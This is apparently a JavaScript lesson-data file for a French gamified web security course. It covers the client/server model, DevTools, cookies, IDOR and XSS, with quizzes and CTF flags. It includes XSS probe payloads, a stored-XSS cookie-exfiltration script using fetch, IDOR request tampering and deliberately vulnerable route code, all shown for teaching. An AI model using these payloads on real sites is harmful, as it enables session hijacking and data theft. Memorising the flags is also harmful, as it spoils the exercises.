// Curriculum Track 4: Failles Web Client & Sessions (XSS / IDOR / JWT) - 11 Levels
module.exports = [
  // 1. Architecture Web : Navigateur Client vs Serveur Backend
  {
    id: 'm4-l1',
    unitId: 'm4',
    title: "1. Client (Navigateur) vs Serveur (Backend)",
    icon: '🌐',
    xp: 35,
    lessonSlides: [
      {
        title: "Les Deux Côtés de la Barrière",
        bullets: [
          "Quand tu surfes sur un site web, deux ordinateurs travaillent ensemble : ton propre ordinateur (le **Client** / Navigateur) et l'ordinateur distant (le **Serveur** / Backend).",
          "Le navigateur reçoit trois langages :",
          "• **HTML** : la structure du texte et des boutons (le squelette).",
          "• **CSS** : les couleurs, polices et mises en page (le maquillage).",
          "• **JavaScript** : le code qui s'exécute **directement dans ton navigateur** pour animer la page !"
        ]
      },
      {
        title: "La Règle d'Or : Ne Jamais Faire Confiance au Client",
        bullets: [
          "Tout ce qui se trouve côté client (dans ton navigateur) est **100% sous ton contrôle total**.",
          "Tu peux modifier le code HTML, réécrire les scripts JavaScript, changer les valeurs des formulaires et manipuler les requêtes réseau à volonté.",
          "Si un développeur place la sécurité uniquement côté client, son application est déjà compromise !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="150" height="70" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="100" y="50" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">CLIENT (Navigateur)</text>
          <text x="100" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">HTML / CSS / JavaScript</text>
          <text x="100" y="85" fill="#f59e0b" font-size="9" font-family="monospace" text-anchor="middle">Contrôlé par l'utilisateur !</text>
          <path d="M 185 60 L 225 60" stroke="#475569" stroke-width="2"/>
          <rect x="235" y="25" width="140" height="70" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
          <text x="305" y="50" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">SERVEUR (Backend)</text>
          <text x="305" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Node / PHP / SQLite</text>
          <text x="305" y="85" fill="#38bdf8" font-size="9" font-family="monospace" text-anchor="middle">Vérification de sécurité</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// ❌ ERREUR DE DÉVELOPPEUR : Vérification de sécurité faite dans le navigateur !" },
          { num: 2, text: "if (userRole === 'admin') { showAdminButton(); }", isCritical: true, note: "L'attaquant peut ouvrir la console F12 et taper userRole = 'admin' pour contourner le contrôle !" },
          { num: 3, text: "// La vérification doit TOUJOURS être ré-exécutée côté serveur" }
        ],
        prompt: "Clique sur la ligne où la vérification d'autorisation est naïvement confiée au client :"
      },
      tokenPuzzle: {
        instruction: "Tape la condition côté client manipulable par un attaquant dans sa console :",
        tokens: ["if (userRole === 'admin')", "showAdminButton();", "db.query()"],
        correctOrder: ["if (userRole === 'admin')", "showAdminButton();"]
      },
      quickQuiz: {
        prompt: "Pourquoi est-il strictement interdit en cybersécurité de valider les droits d'un utilisateur uniquement en JavaScript dans le navigateur ?",
        options: [
          { text: "Parce que l'utilisateur a un contrôle absolu sur son navigateur et peut modifier ou désactiver le code JavaScript avec les DevTools F12.", isCorrect: true, debrief: "Exact ! Le client est un environnement non fiable par définition." },
          { text: "Parce que le JavaScript ne fonctionne que sur les ordinateurs Apple.", isCorrect: false, debrief: "Faux. JavaScript fonctionne sur tous les navigateurs de la planète." },
          { text: "Parce que le navigateur détruit les données toutes les 10 minutes.", isCorrect: false, debrief: "Faux. La persistance est gérée par le stockage local." },
          { text: "Parce que le protocole HTTP interdit l'usage de conditions if.", isCorrect: false, debrief: "Faux. HTTP transporte du code sans l'interpréter." }
        ]
      }
    },
    challenge: {
      type: 'idor_target',
      instructions: "Dans le portail financier Aegis ci-dessous, consulte ta facture légitime n°102. Soumets l'intitulé de la facture affiché (Facture #INV-2026-102) !",
      flag: 'Facture #INV-2026-102'
    }
  },

  // 2. Les Outils de Développement du Navigateur (DevTools F12)
  {
    id: 'm4-l2',
    unitId: 'm4',
    title: "2. Les Outils DevTools (Touche F12)",
    icon: '🛠️',
    xp: 35,
    lessonSlides: [
      {
        title: "L'Arme Ultime Intégrée au Navigateur",
        bullets: [
          "Chaque navigateur moderne (Chrome, Firefox, Edge) possède une suite d'ingénierie intégrée accessible en appuyant sur la touche **F12** : les **DevTools**.",
          "C'est la radiographie complète de la page web en direct."
        ]
      },
      {
        title: "Les 4 Onglets Capitaux de l'Analyste",
        bullets: [
          "• **Éléments / Inspecteur** : affiche le code HTML en direct. Tu peux double-cliquer pour changer un prix, démasquer un champ caché (`type='hidden'`) ou débloquer un bouton grisé !",
          "• **Console** : un terminal JavaScript direct connecté à la page.",
          "• **Réseau (Network)** : écoute et enregistre chaque requête HTTP envoyée et reçue avec ses en-têtes et paramètres.",
          "• **Application / Stockage** : permet de lire et modifier les **Cookies** et le LocalStorage."
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="80" height="70" rx="6" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="65" y="55" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">F12</text>
          <text x="65" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Inspecteur</text>
          <rect x="115" y="25" width="80" height="70" rx="6" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
          <text x="155" y="55" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">Console</text>
          <text x="155" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">JavaScript</text>
          <rect x="205" y="25" width="80" height="70" rx="6" fill="#0f172a" stroke="#3b82f6" stroke-width="2"/>
          <text x="245" y="55" fill="#60a5fa" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">Réseau</text>
          <text x="245" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Requêtes HTTP</text>
          <rect x="295" y="25" width="80" height="70" rx="6" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
          <text x="335" y="55" fill="#fbbf24" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">Cookies</text>
          <text x="335" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Sessions</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// Exécution directe dans la Console F12 de l'analyste :" },
          { num: 2, text: "console.log(document.cookie);", isCritical: true, note: "La console F12 permet d'interagir immédiatement avec l'environnement de la page" },
          { num: 3, text: "// Affiche les cookies de session actifs de l'utilisateur" }
        ],
        prompt: "Clique sur l'instruction JavaScript exécutable dans la console pour inspecter les cookies :"
      },
      tokenPuzzle: {
        instruction: "Tape la commande JavaScript pour afficher les cookies dans la console F12 :",
        tokens: ["console.log(", "document.cookie", ");", "alert(1)"],
        correctOrder: ["console.log(", "document.cookie", ");"]
      },
      quickQuiz: {
        prompt: "Quel onglet des DevTools (F12) permet d'espionner toutes les requêtes HTTP (méthodes, codes de statut, payloads) échangées avec le serveur ?",
        options: [
          { text: "L'onglet Réseau (Network).", isCorrect: true, debrief: "Exact ! L'onglet Réseau capture en temps réel chaque communication HTTP." },
          { text: "L'onglet Performance.", isCorrect: false, debrief: "Faux. Performance sert au profilage de framerate et mémoire." },
          { text: "L'onglet Mémoire (Memory Heap).", isCorrect: false, debrief: "Faux. Memory sert à chasser les fuites de mémoire vive." },
          { text: "L'onglet Thème graphique.", isCorrect: false, debrief: "Faux. Cet onglet n'existe pas pour l'analyse de protocole." }
        ]
      }
    },
    challenge: {
      type: 'idor_target',
      instructions: "Dans le portail de facturation, observe le montant de ta facture n°102 affiché en euros. Soumets le montant numérique brut (1250) !",
      flag: '1250'
    }
  },

  // 3. Qu'est-ce qu'un Cookie et une Session Web ?
  {
    id: 'm4-l3',
    unitId: 'm4',
    title: "3. Cookies & Gestion de Session",
    icon: '🍪',
    xp: 35,
    lessonSlides: [
      {
        title: "HTTP est Amnésique : L'État Sans État (Stateless)",
        bullets: [
          "Par conception d'origine, le protocole HTTP est totalement amnésique : dès qu'une page a fini de charger, le serveur oublie instantanément qui tu es.",
          "Sans un système de mémoire, tu devrais retaper ton mot de passe à chaque fois que tu cliques sur un lien !",
          "Pour résoudre ce problème, on a inventé les **Cookies de session**."
        ]
      },
      {
        title: "Le Tampon sur le Poignet",
        bullets: [
          "Quand tu te connectes avec succès, le serveur t'envoie un en-tête `Set-Cookie: session_id=abc123xyz`.",
          "C'est comme un tampon invisible sur ton poignet à l'entrée d'une boîte de nuit.",
          "À chaque requête suivante, ton navigateur renvoie automatiquement ce tampon dans l'en-tête `Cookie: session_id=abc123xyz`.",
          "Si un attaquant réussit à copier ce cookie, il devient **TOI** instantanément sans avoir besoin de ton mot de passe !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="120" height="70" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="85" y="55" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle">Navigateur</text>
          <text x="85" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Stocke le Cookie</text>
          <path d="M 155 50 L 245 50" stroke="#f59e0b" stroke-width="2"/>
          <text x="200" y="42" fill="#fbbf24" font-size="9" font-family="monospace" text-anchor="middle">Cookie: session=xyz ➔</text>
          <rect x="255" y="25" width="120" height="70" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
          <text x="315" y="55" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle">Serveur</text>
          <text x="315" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Reconnaît l'utilisateur</text>
        </svg>
      `,
      codeSnippet: {
        language: 'http',
        lines: [
          { num: 1, text: "GET /api/profile HTTP/1.1" },
          { num: 2, text: "Host: aegis-defense.local" },
          { num: 3, text: "Cookie: session_token=SECRET_SESSION_TOKEN_42", isCritical: true, note: "Le cookie de session prouve l'identité de l'utilisateur à chaque requête" }
        ],
        prompt: "Clique sur l'en-tête HTTP qui transporte le jeton de session :"
      },
      tokenPuzzle: {
        instruction: "Reconstitue l'en-tête HTTP de transmission du jeton de cookie de session :",
        tokens: ["Cookie:", "session_id=SECRET_SESSION_99;", "User-Agent:", "Host:"],
        correctOrder: ["Cookie:", "session_id=SECRET_SESSION_99;"]
      },
      quickQuiz: {
        prompt: "Que se passe-t-il si un pirate intercepte ou vole la valeur de ton cookie de session d'un site web ?",
        options: [
          { text: "Il peut l'injecter dans son propre navigateur et usurper ton compte connecté sans connaître ton mot de passe.", isCorrect: true, debrief: "Exact ! C'est ce qu'on appelle le vol de session (Session Hijacking)." },
          { text: "Son ordinateur prend feu physiquement.", isCorrect: false, debrief: "Faux. Aucun risque physique matériel." },
          { text: "Le mot de passe de ton compte est automatiquement remplacé par des zéros.", isCorrect: false, debrief: "Faux. Le mot de passe ne change pas." },
          { text: "Le serveur refuse toutes les futures connexions mondiales.", isCorrect: false, debrief: "Faux. Le serveur ne sait même pas qu'il s'agit d'un usurpateur." }
        ]
      }
    },
    challenge: {
      type: 'idor_target',
      instructions: "Dans le portail financier, repère l'identifiant numérique de ton compte transmis dans le champ ID. Soumets ce numéro client (102) !",
      flag: '102'
    }
  },

  // 4. Qu'est-ce qu'un IDOR (Insecure Direct Object Reference) ?
  {
    id: 'm4-l4',
    unitId: 'm4',
    title: "4. Le Vol d'Accès IDOR (Changer un Chiffre)",
    icon: '🔑',
    xp: 40,
    lessonSlides: [
      {
        title: "L'Une des Failles les Plus Répandues au Monde",
        bullets: [
          "**IDOR** signifie **Insecure Direct Object Reference** (Référence Directe Non Sécurisée à un Objet).",
          "Imagine que tu consultes ta facture médicale sur un site. L'URL est : `https://hopital.com/facture?id=102`.",
          "Que se passe-t-il si tu remplaces simplement `102` par `101` dans la barre d'adresse ?"
        ]
      },
      {
        title: "L'Absence Totale de Contrôle d'Autorisation",
        bullets: [
          "Dans une application mal programmée, le serveur prend le chiffre `101`, va chercher la facture n°101 en base et te l'affiche **sans vérifier si tu en es le propriétaire légitime** !",
          "C'est une faille d'autorisation monumentale : en faisant varier un simple numéro, un attaquant peut télécharger toutes les factures, tous les contrats et tous les profils privés de l'entreprise en quelques minutes."
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="107" y="50" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle">Ma facture : id=102</text>
          <text x="107" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Accès Légitime (1 250 €)</text>
          <path d="M 200 60 L 235 60" stroke="#f43f5e" stroke-width="3"/>
          <rect x="245" y="25" width="140" height="70" rx="8" fill="#030712" stroke="#f43f5e" stroke-width="2"/>
          <text x="315" y="50" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle">IDOR : id=101</text>
          <text x="315" y="70" fill="#fbbf24" font-size="9" font-family="monospace" text-anchor="middle">Facture Direction (4,5M €)</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// ❌ CODE BACKEND VULNÉRABLE À L'IDOR :" },
          { num: 2, text: "app.get('/api/invoices/:id', (req, res) => {", isCritical: true, note: "Le serveur extrait l'ID demandé sans vérifier l'appartenance à la session" },
          { num: 3, text: "  const invoice = db.query('SELECT * FROM invoices WHERE id = ?', [req.params.id]);" },
          { num: 4, text: "  res.json(invoice); // N'importe qui peut lire n'importe quelle facture !" },
          { num: 5, text: "});" }
        ],
        prompt: "Clique sur la route API qui accepte un identifiant direct sans contrôle de propriétaire :"
      },
      tokenPuzzle: {
        instruction: "Assemble l'URL détournée exploitant la faille IDOR pour cibler le document n°101 :",
        tokens: ["GET /api/invoices/", "101", "102", "DROP"],
        correctOrder: ["GET /api/invoices/", "101"]
      },
      quickQuiz: {
        prompt: "Quelle est la définition exacte d'une vulnérabilité IDOR (Insecure Direct Object Reference) ?",
        options: [
          { text: "L'accès à une ressource confidentielle simplement en modifiant son identifiant dans la requête, sans que le serveur ne vérifie les droits de l'utilisateur.", isCorrect: true, debrief: "Exact ! C'est un défaut de contrôle d'accès au niveau des objets métier." },
          { text: "Une surcharge de mémoire vive provoquée par un trop grand nombre d'images.", isCorrect: false, debrief: "Faux. C'est une faille de logique d'autorisation, pas de mémoire." },
          { text: "Un câble réseau débranché dans le centre de données.", isCorrect: false, debrief: "Faux. C'est un problème matériel sans lien avec l'IDOR." },
          { text: "L'utilisation d'une police de caractères non supportée par le navigateur.", isCorrect: false, debrief: "Faux. La typographie n'a aucun impact de sécurité." }
        ]
      }
    },
    challenge: {
      type: 'idor_target',
      instructions: "Dans le portail financier, modifie le numéro de facture 102 par 101 pour accéder à la facture confidentielle de la direction. Soumets le drapeau CYBER{...} trouvé dans les détails !",
      flag: 'CYBER{IDOR_DIRECT_OBJECT_FINANCIAL_LEAK}'
    }
  },

  // ★ CHECKPOINT ÉVALUATION MI-PARCOURS TRACK 4 ★
  {
    id: 'm4-mid',
    unitId: 'm4',
    title: "ÉVALUATION MI-PARCOURS : AUDIT DE SESSIONS & IDOR RH",
    icon: '🛡️',
    isCheckpoint: true,
    xp: 75,
    lessonSlides: [
      {
        title: "AUDIT DE CONTRÔLE D'ACCÈS : Bordereaux Stratégiques de la Présidence",
        bullets: [
          "Le portail financier restreint d'Aegis traite les factures et ordres de paiement confidentiels.",
          "Ton profil utilisateur est restreint aux factures de commodité standard (ex: facture n°42).",
          "Cette épreuve récapitule : architecture client-serveur, manipulation des DevTools, inspection des paramètres de requêtes et falsification de références directes (IDOR)."
        ]
      },
      {
        title: "Mission de Test d'Intrusion (Sans Guidage)",
        bullets: [
          "1. Ouvre le visualiseur de facturation ci-dessous.",
          "2. Identifie la référence directe manipulable dans l'interface.",
          "3. Audite les identifiants réservés au Conseil de Surveillance (bordereau n°1) et soumets le code de compensation officiel !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 500 130" class="w-full h-full">
          <rect width="500" height="130" rx="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
          <circle cx="65" cy="65" r="32" fill="#f59e0b" fill-opacity="0.15" stroke="#f59e0b" stroke-width="2"/>
          <text x="65" y="74" fill="#f59e0b" font-size="28" text-anchor="middle">🛡️</text>
          <text x="120" y="45" fill="#f8fafc" font-size="14" font-family="monospace" font-weight="bold">CHECKPOINT IDOR & SESSION MI-PARCOURS</text>
          <text x="120" y="70" fill="#94a3b8" font-size="11" font-family="monospace">Périmètre : Portail de Facturation / Endpoint /invoices</text>
          <rect x="120" y="85" width="350" height="26" rx="6" fill="#1e293b" stroke="#334155"/>
          <text x="130" y="102" fill="#f59e0b" font-size="11" font-family="monospace">Cible : Bordereau n°1 (Présidence & Surveillance)</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// Audit de contrôle d'accès : falsification de l'identifiant direct" },
          { num: 2, text: "fetch('/targets/api/invoices?id=1'); // Bordereau n°1 Présidence", isCritical: true, note: "La falsification du paramètre id vers la ressource 1 permet de franchir le cloisonnement" },
          { num: 3, text: "{ invoice_id: 'INV-2026-001', confidentiality: 'SECRET DEFENSE' }" }
        ],
        prompt: "Clique sur l'appel API qui falsifie la référence directe vers le bordereau présidentiel :"
      },
      tokenPuzzle: {
        instruction: "Reconstitue la requête directe pour accéder au bordereau d'autorisation n°1 :",
        tokens: ["GET /targets/api/invoices?id=", "1", "42", "DELETE"],
        correctOrder: ["GET /targets/api/invoices?id=", "1"]
      },
      quickQuiz: {
        prompt: "Pourquoi une vulnérabilité IDOR est-elle considérée comme un échec critique d'architecture ?",
        options: [
          { text: "Parce que le serveur s'appuie aveuglément sur un identifiant fourni par le client sans valider que la session a le droit d'y accéder.", isCorrect: true, debrief: "Exact ! La sécurité ne doit JAMAIS faire confiance aux entrées envoyées par le client web." },
          { text: "Parce qu'elle empêche le navigateur d'afficher les polices d'écriture en gras.", isCorrect: false, debrief: "Faux. L'IDOR est une brèche d'autorisation de données, aucun lien visuel." },
          { text: "Parce qu'elle n'affecte que les ordinateurs utilisant un écran tactile.", isCorrect: false, debrief: "Faux. Tous les clients HTTP sont concernés de la même façon." },
          { text: "Parce qu'elle augmente automatiquement la facture internet de la victime.", isCorrect: false, debrief: "Faux. C'est une extraction de données confidentielles." }
        ]
      }
    },
    challenge: {
      type: 'idor_target',
      instructions: "Dans le portail de facturation, cible le bordereau n°1 de la Présidence pour extraire les données classifiées SECRET DEFENSE. Soumets le code de virement FLAG !",
      flag: 'CYBER{CLIENT_MID_EVAL_IDOR_SESSION_PWNED}'
    }
  },

  // 5. Qu'est-ce que le Cross-Site Scripting (XSS) ?
  {
    id: 'm4-l5',
    unitId: 'm4',
    title: "5. Qu'est-ce que le Cross-Site Scripting (XSS) ?",
    icon: '⚡',
    xp: 40,
    lessonSlides: [
      {
        title: "Forcer le Navigateur d'Autrui à Obéir",
        bullets: [
          "Le **Cross-Site Scripting** (noté **XSS**) est l'une des attaques web les plus célèbres et les plus destructrices.",
          "Le principe fondamental : l'attaquant réussit à **injecter son propre code JavaScript malveillant** à l'intérieur d'une page web légitime.",
          "Quand une autre personne (ex: un administrateur) visite la page, son propre navigateur exécute ce code avec les droits de la victime !"
        ]
      },
      {
        title: "La Sonde XSS Universelle",
        bullets: [
          "Pour tester si un champ de texte est vulnérable au XSS, les pentesters injectent une balise script inoffensive qui ouvre une boîte de dialogue :",
          "`<script>alert(1)</script>` ou `<img src=x onerror=alert(1)>`.",
          "Si la boîte de dialogue surgit à l'écran, cela prouve que le code injecté a été interprété par le moteur JavaScript du navigateur !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#f43f5e" stroke-width="2"/>
          <text x="107" y="50" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle">&lt;script&gt;alert(1)&lt;/script&gt;</text>
          <text x="107" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Payload injecté</text>
          <path d="M 200 60 L 235 60" stroke="#10b981" stroke-width="2"/>
          <rect x="245" y="25" width="140" height="70" rx="8" fill="#030712" stroke="#10b981" stroke-width="2"/>
          <text x="315" y="50" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle">Boîte alert(1) !</text>
          <text x="315" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Exécution JS validée</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// ❌ AFFICHAGE NON ÉCHAPPÉ DANS LE DOM :" },
          { num: 2, text: "document.getElementById('welcome').innerHTML = userInput;", isCritical: true, note: "innerHTML interprète le HTML et les balises <script> injectées par l'utilisateur" },
          { num: 3, text: "// La bonne pratique sécurisée est d'utiliser textContent" }
        ],
        prompt: "Clique sur la propriété vulnérable qui interprète les balises HTML/JS :"
      },
      tokenPuzzle: {
        instruction: "Construis la balise d'injection XSS minimale pour tester la présence de la faille :",
        tokens: ["<script>", "alert(1)", "</script>", "<h1>"],
        correctOrder: ["<script>", "alert(1)", "</script>"]
      },
      quickQuiz: {
        prompt: "Dans quel environnement le code malveillant d'une faille XSS s'exécute-t-il ?",
        options: [
          { text: "Dans le navigateur web de la victime qui consulte la page infectée.", isCorrect: true, debrief: "Exact ! Le XSS est une faille côté client exécutée par le moteur JavaScript du navigateur." },
          { text: "Sur le processeur de la carte mère du centre de données.", isCorrect: false, debrief: "Faux. Le serveur ne fait que renvoyer le texte, c'est le client qui l'exécute." },
          { text: "Dans la mémoire vive du routeur WiFi du fournisseur d'accès.", isCorrect: false, debrief: "Faux. Le routeur ne fait que router des paquets TCP." },
          { text: "Dans la base de données SQL.", isCorrect: false, debrief: "Faux. La base stocke le texte, mais c'est le navigateur qui l'exécute." }
        ]
      }
    },
    challenge: {
      type: 'webmail_target',
      instructions: "Dans l'interface SkyMail Webmail, crée un message avec le payload <script>alert(1)</script> dans le champ 'Objet'. Soumets la commande JavaScript exécutée (alert(1)) !",
      flag: 'alert(1)'
    }
  },

  // 6. XSS Réfléchie (Reflected XSS)
  {
    id: 'm4-l6',
    unitId: 'm4',
    title: "6. XSS Réfléchie (Reflected XSS)",
    icon: '🪞',
    xp: 40,
    lessonSlides: [
      {
        title: "L'Effet Miroir de l'URL",
        bullets: [
          "Une faille **XSS Réfléchie** (Reflected XSS) se produit quand un paramètre passé dans l'URL est immédiatement réinjecté dans le code HTML de la page de réponse sans être nettoyé ni encodé.",
          "Exemple : `https://site.com/search?q=<script>alert(1)</script>`.",
          "Le serveur répond : *Votre recherche pour <script>alert(1)</script> n'a donné aucun résultat*... et le navigateur exécute le script immédiatement !"
        ]
      },
      {
        title: "Comment Piéger une Victime",
        bullets: [
          "Le payload n'est pas stocké sur le serveur.",
          "L'attaquant doit donc convaincre la victime de **cliquer sur un lien piégé** (par phishing ou e-mail frauduleux) contenant le code JavaScript directement dissimulé dans l'adresse web !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="107" y="50" fill="#38bdf8" font-size="10" font-family="monospace" text-anchor="middle">Lien : ?q=&lt;script&gt;...</text>
          <text x="107" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Clic de la victime</text>
          <path d="M 200 60 L 235 60" stroke="#f59e0b" stroke-width="2"/>
          <rect x="245" y="25" width="140" height="70" rx="8" fill="#030712" stroke="#f59e0b" stroke-width="2"/>
          <text x="315" y="50" fill="#fbbf24" font-size="11" font-family="monospace" text-anchor="middle">Réflexion Miroir</text>
          <text x="315" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Exécution immédiate</text>
        </svg>
      `,
      codeSnippet: {
        language: 'html',
        lines: [
          { num: 1, text: "<!-- Résultat HTML renvoyé par le serveur après recherche : -->" },
          { num: 2, text: "<h1>Résultats pour : <img src=x onerror=alert(document.cookie)></h1>", isCritical: true, note: "Le paramètre d'URL est réinjecté sans encodage des caractères < et >" },
          { num: 3, text: "<!-- Le navigateur tente de charger l'image 'x', échoue et exécute onerror -->" }
        ],
        prompt: "Clique sur la ligne HTML vulnérable qui reflète le payload d'erreur d'image :"
      },
      tokenPuzzle: {
        instruction: "Reconstitue le payload XSS alternatif exploitant l'attribut onerror d'une balise img :",
        tokens: ["<img src=x", "onerror=alert(document.cookie)>", "<script>", "<h1>"],
        correctOrder: ["<img src=x", "onerror=alert(document.cookie)>"]
      },
      quickQuiz: {
        prompt: "Quelle est la caractéristique distinctive d'une attaque XSS Réfléchie (Reflected) par rapport à une XSS Stockée ?",
        options: [
          { text: "Le code malveillant n'est pas sauvegardé sur le serveur ; il transite dans la requête (URL) et est renvoyé dans la réponse.", isCorrect: true, debrief: "Exact ! La victime doit obligatoirement cliquer sur un lien forgé contenant le payload." },
          { text: "Elle détruit physiquement le serveur web en 24 heures.", isCorrect: false, debrief: "Faux. Elle ne détruit aucun composant serveur." },
          { text: "Elle s'exécute uniquement si l'ordinateur est débranché du secteur.", isCorrect: false, debrief: "Faux. Elle nécessite une connexion active." },
          { text: "Elle est indétectable par les antivirus.", isCorrect: false, debrief: "Faux. Les pare-feux applicatifs détectent souvent les signatures XSS dans les URL." }
        ]
      }
    },
    challenge: {
      type: 'webmail_target',
      instructions: "Dans SkyMail, envoie un message contenant le payload <img src=x onerror=alert(document.cookie)>. Soumets la propriété ciblée par l'alerte pour lire les cookies (document.cookie) !",
      flag: 'document.cookie'
    }
  },

  // 7. XSS Stockée (Stored XSS)
  {
    id: 'm4-l7',
    unitId: 'm4',
    title: "7. XSS Stockée (Stored XSS) : Le Poison en Base",
    icon: '☣️',
    xp: 45,
    lessonSlides: [
      {
        title: "La Faille XSS la Plus Dangereuse",
        bullets: [
          "Contrairement à la XSS réfléchie qui nécessite d'envoyer un lien à chaque victime, la **XSS Stockée** (Stored XSS) est un piège persistant posé au sol.",
          "L'attaquant soumet un message, un commentaire de blog ou un nom de profil contenant son payload JavaScript malveillant.",
          "Le serveur enregistre ce payload **directement dans sa base de données** !"
        ]
      },
      {
        title: "L'Infection Automatique de Tous les Utilisateurs",
        bullets: [
          "Dès lors, chaque fois qu'un utilisateur ordinaire ou un administrateur ouvre la boîte de réception ou consulte le profil, la page charge le texte depuis la base.",
          "Le script de l'attaquant s'exécute automatiquement dans le navigateur de la victime **sans qu'elle n'ait besoin de cliquer sur le moindre lien suspect** !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="100" height="70" rx="8" fill="#0f172a" stroke="#f43f5e" stroke-width="2"/>
          <text x="75" y="55" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle">Attaquant</text>
          <text x="75" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Poste le script</text>
          <path d="M 135 60 L 195 60" stroke="#f43f5e" stroke-width="2"/>
          <rect x="205" y="25" width="80" height="70" rx="8" fill="#0f172a" stroke="#3b82f6" stroke-width="2"/>
          <text x="245" y="55" fill="#60a5fa" font-size="11" font-family="monospace" text-anchor="middle">Base DB</text>
          <text x="245" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Stocké !</text>
          <path d="M 295 60 L 325 60" stroke="#10b981" stroke-width="2"/>
          <rect x="335" y="25" width="55" height="70" rx="8" fill="#030712" stroke="#10b981" stroke-width="2"/>
          <text x="362" y="55" fill="#34d399" font-size="10" font-family="monospace" text-anchor="middle">Admin</text>
          <text x="362" y="75" fill="#f43f5e" font-size="9" font-family="monospace" text-anchor="middle">Infecté !</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// Payload XSS Stocké dans le message de messagerie :" },
          { num: 2, text: "<script>fetch('/stolen?c=' + document.cookie);</script>", isCritical: true, note: "Ce script sera exécuté par l'administrateur lorsqu'il ouvrira son webmail" },
          { num: 3, text: "// Exfiltre le cookie administrateur vers le serveur de l'attaquant" }
        ],
        prompt: "Clique sur la charge utile qui envoie le cookie vers un collecteur externe :"
      },
      tokenPuzzle: {
        instruction: "Assemble le payload d'exfiltration de cookies par fonction fetch :",
        tokens: ["<script>fetch('/stolen?c='", "+ document.cookie);", "</script>", "alert(1)"],
        correctOrder: ["<script>fetch('/stolen?c='", "+ document.cookie);", "</script>"]
      },
      quickQuiz: {
        prompt: "Pourquoi une vulnérabilité XSS Stockée (Stored) est-elle généralement classée avec un score de criticité beaucoup plus élevé qu'une XSS Réfléchie ?",
        options: [
          { text: "Parce qu'elle persiste en base de données et infecte passivement toute personne (dont les administrateurs) qui consulte la page, sans interaction particulière.", isCorrect: true, debrief: "Exact ! Le poison est permanent et frappe à grande échelle." },
          { text: "Parce qu'elle formate automatiquement les cartes graphiques des utilisateurs.", isCorrect: false, debrief: "Faux. JavaScript dans un navigateur ne peut pas formater le matériel." },
          { text: "Parce qu'elle empêche définitivement les câbles Ethernet de fonctionner.", isCorrect: false, debrief: "Faux. Aucun impact physique sur les câbles." },
